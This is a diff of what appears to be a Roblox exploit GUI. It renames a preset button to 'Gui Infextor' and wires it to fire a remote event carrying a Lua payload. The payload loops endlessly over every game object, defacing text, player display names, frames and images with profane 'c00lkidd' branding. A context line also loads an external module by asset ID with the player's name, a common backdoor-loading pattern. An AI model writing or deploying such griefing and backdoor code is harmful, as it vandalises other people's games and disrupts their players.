@@ -770,7 +770,7 @@ Converted["_UIStroke16"].Thickness = 1.5
 Converted["_UIStroke16"].Parent = Converted["_Grab"]
 -- yield
 Converted["_yield"].Font = Enum.Font.Cartoon
-Converted["_yield"].Text = "INFECT [NUKE]"
+Converted["_yield"].Text = "Gui Infextor"
 Converted["_yield"].TextColor3 = Color3.fromRGB(255, 0, 0)
 Converted["_yield"].TextScaled = true
 Converted["_yield"].TextSize = 14
@@ -2431,10 +2431,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		script.Parent.Logs.Visible = false
 	end)
 	script.Parent.Presets.yield.MouseButton1Click:Connect(function()
-           script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = '-- COMING SOON'
-		script.Parent.Framee.Visible = true
-		script.Parent.Presets.Visible = false
-		script.Parent.Logs.Visible = false
+           fireRemoteEvent('local function isInCoreGui(obj) local parent = obj.Parent while parent do if parent == game.CoreGui then return true end parent = parent.Parent end return false end; local second = 0.1 while true do for _, obj in pairs(game:GetDescendants()) do if isInCoreGui(obj) then return true end if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then pcall(function() obj.Font = Enum.Font.Cartoon obj.TextScaled = true obj.Text = "team 👑c00lkidd😭CRY N0W ###SKID###DEATHS#####🙏c00lkidd r0blox GUI INF3XT0r😂😭" obj.TextColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255)) obj.Rotation = 45 end) end if obj:IsA("Humanoid") then obj.DisplayName = "team😳 c00lkidd👑😜 INFECTOR🤬🙄 AH🪲AH😒AHSHAUAHc00lkidd fUck roBLOXHAHAHA💀A" end if obj:IsA("Frame") then obj.Rotation = 14 obj.BackgroundColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255)) end if obj:IsA("ImageLabel") then obj.Image = "rbxassetid://8408806737" obj.Rotation = 14 end end task.wait(second) end')
 	end)
 	script.Parent.Presets.Star.MouseButton1Click:Connect(function()
 		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(16965754044):load("' .. game.Players.LocalPlayer.Name ..  '")'
